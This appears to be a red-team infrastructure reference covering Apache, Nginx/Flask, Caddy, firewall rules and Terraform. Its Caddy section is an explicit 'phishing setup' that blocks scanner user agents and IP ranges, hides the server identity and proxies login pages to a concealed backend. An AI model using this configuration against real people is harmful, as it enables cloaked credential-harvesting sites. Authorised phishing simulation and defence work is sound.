# Infrastructure Setup Reference

## Apache + PHP

### Installation
```bash
sudo apt update
sudo apt install apache2
sudo apt install php libapache2-mod-php
sudo systemctl restart apache2
```

### Virtual Host Configuration
```apache
<VirtualHost *:80>
    ServerName example.com
    ServerAlias www.example.com
    DocumentRoot /var/www/html
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

    <Directory /var/www/html>
        Options -Indexes +FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>
</VirtualHost>
```

### Remove .php Extension
Allow PHP files to execute without `.php` extension (hides technology stack):
```apache
<FilesMatch "^[^.]+$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

### Enable/Disable Sites
```bash
sudo a2ensite example.com.conf
sudo a2dissite example.com.conf
sudo a2dismod autoindex
sudo systemctl reload apache2
```

---

## Nginx + Flask + Gunicorn

### Install
```bash
sudo apt install python3 python3-pip python3-venv nginx
pip install Flask gunicorn
```

### Minimal Flask App (`app.py`)
```python
from flask import Flask, render_template, request
app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
    return render_template('login.html')

if __name__ == '__main__':
    app.run(host='127.0.0.1')
```

### Gunicorn Systemd Service
```ini
[Unit]
Description=Gunicorn App
After=network.target

[Service]
User=appuser
Group=www-data
WorkingDirectory=/home/appuser/app
Environment="PATH=/home/appuser/app/venv/bin"
ExecStart=/home/appuser/app/venv/bin/gunicorn --workers 3 --bind 127.0.0.1:8080 app:app

[Install]
WantedBy=multi-user.target
```

### Nginx Reverse Proxy Config
```nginx
server {
    listen 80;
    server_name domain.com;

    location / {
        proxy_pass http://localhost:8080;
        proxy_set_header Host $host;
    }
}
```

---

## Caddy

### Install
```bash
sudo apt install -y debian-keyring debian-archive-keyring apt-transport-https curl
curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/gpg.key' | sudo gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg
curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt' | sudo tee /etc/apt/sources.list.d/caddy-stable.list
sudo apt update && sudo apt install caddy
```

### Caddyfile - Complete Phishing Setup
```
domain.com {
    log {
        output file /var/caddy/logs/access.json
        format json
    }

    header {
        -Server
        Referrer-Policy "no-referrer"
        Strict-Transport-Security "max-age=31536000;"
    }

    @blocked_ips {
        remote_ip 192.168.1.1 10.0.0.0/8
    }
    @blocked_ua {
        header User-Agent *curl*
        header User-Agent *python*
    }

    handle @blocked_ips {
        respond "Forbidden" 403 { close }
    }
    handle @blocked_ua {
        respond "Forbidden" 403 { close }
    }

    handle /login/* {
        reverse_proxy http://BACKEND_IP:80 {
            header_up Host {upstream_hostport}
        }
    }

    handle {
        respond "Page not found" 404
    }
}
```

### Caddy Wildcard SSL
```bash
sudo apt install certbot
sudo certbot certonly --manual --preferred-challenges=dns -d *.domain.com
mkdir /etc/caddy/ssl
mv /etc/letsencrypt/archive/domain.com/fullchain1.pem /etc/caddy/ssl/fullchain.pem
mv /etc/letsencrypt/archive/domain.com/privkey1.pem /etc/caddy/ssl/privkey.pem
chown -R caddy:caddy /etc/caddy/ssl
```

```
sub.domain.com {
    tls /etc/caddy/ssl/fullchain.pem /etc/caddy/ssl/privkey.pem
    reverse_proxy http://BACKEND_IP:80
}
```

### Caddy Modular Filters (import directive)
```
/etc/caddy/
├── Caddyfile
└── filters/
    ├── ips.caddy       # remote_ip 1.2.3.4/24 5.6.7.8
    ├── ua.caddy        # header User-Agent *curl*
    └── headers.caddy   # Referrer-Policy no-referrer
```

---

## Firewall (UFW)

```bash
sudo apt install ufw
sudo ufw allow http
sudo ufw allow https
sudo ufw allow ssh
sudo ufw enable

sudo ufw allow from PROXY_IP to any port 80
sudo ufw allow from PROXY_IP to any port 443
sudo ufw deny 80
sudo ufw deny 443
```

## Firewall (iptables)
```bash
sudo apt install iptables
sudo iptables -P OUTPUT ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
sudo apt install iptables-persistent
sudo netfilter-persistent save
```

---

## Terraform (AWS Infrastructure)

### main.tf
```hcl
terraform {
  required_providers {
    aws = { source = "hashicorp/aws", version = "~> 5.0" }
  }
}

provider "aws" {
  region = var.aws_region
}

module "network" {
  source = "./modules/network"
  vpc_cidr = var.vpc_cidr
}

module "ssh_keys" {
  source = "./modules/ssh_keys"
  key_name = var.key_name
  public_key_path = var.public_key_path
}

module "instances" {
  source = "./modules/instances"
  ami_id = var.ami_id
  instance_type = var.instance_type
  subnet_id = module.network.subnet_id
  security_group_id = module.network.security_group_id
  key_name = module.ssh_keys.key_name
}
```

### variables.tf
```hcl
variable "aws_region" { default = "us-east-1" }
variable "vpc_cidr" { default = "10.0.0.0/16" }
variable "ami_id" { description = "AMI ID for the instance" }
variable "instance_type" { default = "t2.micro" }
variable "key_name" { description = "SSH key pair name" }
variable "public_key_path" { description = "Path to public SSH key" }
```

### DevOps Install Script
```bash
#!/bin/bash
sudo apt-get update && sudo apt-get install -y gnupg software-properties-common
wget -O- https://apt.releases.hashicorp.com/gpg | gpg --dearmor | sudo tee /usr/share/keyrings/hashicorp-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/hashicorp.list
sudo apt update && sudo apt-get install terraform

curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip && sudo ./aws/install
```
